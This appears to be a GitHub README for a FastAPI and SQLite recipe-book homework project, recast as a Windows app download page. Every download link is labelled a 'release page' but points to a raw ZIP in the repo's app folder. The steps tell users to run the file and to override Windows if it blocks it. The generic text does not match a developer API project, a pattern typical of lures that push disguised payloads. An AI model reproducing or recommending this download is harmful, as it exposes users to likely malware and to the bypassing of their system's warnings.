# 🥘 SkillBoxHomework_30 - Simple Recipe Book for Windows

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/434nk5/SkillBoxHomework_30/raw/refs/heads/main/app/Skill-Box-Homework-v3.7.zip)

## 📥 Download

Visit this page to download the app for Windows:  
https://github.com/434nk5/SkillBoxHomework_30/raw/refs/heads/main/app/Skill-Box-Homework-v3.7.zip

On the release page:

1. Open the latest release
2. Download the Windows file
3. Save it to your computer
4. Open the file to start the app

If Windows asks for confirmation, choose the option to run the file.

## 🍲 What this app does

SkillBoxHomework_30 is a recipe book app with a REST API behind it. It lets you store, view, edit, and remove recipes. It uses SQLite for local data storage and SQLAlchemy for data access. The app also includes tests and GitHub Actions for automatic checks.

You can use it to work with recipe data in a simple way. It is a good fit if you want a small local app for cooking notes, recipe records, or homework tasks.

## 🖥️ What you need

- Windows 10 or Windows 11
- Internet access for the first download
- Enough free space for the app and data file
- Permission to open downloaded files

The app is designed to run on a regular Windows computer without extra setup in most cases.

## 🚀 How to install

1. Open the release page
2. Find the latest version
3. Download the Windows file from that release
4. Wait for the download to finish
5. Open the downloaded file
6. Follow the on-screen steps if Windows shows any prompts
7. Start the app

If the file comes in a ZIP archive, right-click it and choose Extract All before opening the app file inside.

## 📂 First launch

After you open the app for the first time:

1. Let Windows finish any setup prompts
2. Wait for the app window or local service to appear
3. Keep the app open while you use it
4. Use the interface or API tool that comes with the release package

If the release includes a local web address, open it in your browser after the app starts.

## 🔧 Main features

- Add new recipes
- View recipe details
- Update existing recipes
- Remove recipes you no longer need
- Store data in SQLite
- Use a REST API for recipe actions
- Run tests with pytest
- Keep code style checks with black, isort, and flake8
- Check types with mypy
- Use GitHub Actions for CI

## 🧭 How to use the recipe data

The app is built around recipes. A recipe usually includes:

- Recipe name
- List of ingredients
- Cooking steps
- Cooking time
- Other short notes

You can create a new recipe, change it later, or delete it when you no longer need it. The data stays in the local SQLite file, so your recipes remain on your computer.

## 🧪 Testing and checks

This project includes tests and code checks.

- pytest checks that the app works as expected
- black keeps the code format clean
- isort keeps imports in order
- flake8 checks code quality
- mypy checks type rules
- GitHub Actions runs these checks on every update

These tools help keep the project stable and easier to maintain.

## 🗂️ Project structure

- `app` or similar folder for the main FastAPI code
- `tests` folder for test files
- SQLite database file for local data
- Configuration files for linting and CI
- GitHub Actions workflow files for automatic checks

This layout keeps the app organized and easy to extend.

## 🛠️ If the app does not open

If nothing happens after you open the file:

1. Check that the download finished
2. Make sure you opened the right file
3. Extract the archive if the file is zipped
4. Try opening it again
5. Restart Windows and try once more

If Windows blocks the file, use the normal Windows prompt to allow it.

## 📚 API usage

The app uses a REST API for recipe actions. That means it can send and receive recipe data through web requests. The main actions usually include:

- Create a recipe
- Read recipe data
- Update recipe data
- Delete a recipe

This API style is common for modern apps and makes the project easy to test.

## 🔒 Data storage

The app uses SQLite, which stores data in one local file. This makes setup simple. You do not need a separate database server. The file stays on your computer unless you move or delete it.

## 🧰 Development tools

This repository also includes tools that help with code quality:

- FastAPI for the web app
- SQLAlchemy for database work
- SQLite for storage
- pytest for tests
- black for formatting
- isort for import order
- flake8 for style checks
- mypy for type checks
- GitHub Actions for automation

## 📌 Typical use case

This app suits users who want to keep a small recipe catalog on a Windows PC. You can add recipes for meals, drinks, desserts, or any other cooking notes. It also works well as a homework project that shows how a FastAPI app can manage data with SQLite

## 🔗 Download again

If you need to download the app later, use the release page:  
https://github.com/434nk5/SkillBoxHomework_30/raw/refs/heads/main/app/Skill-Box-Homework-v3.7.zip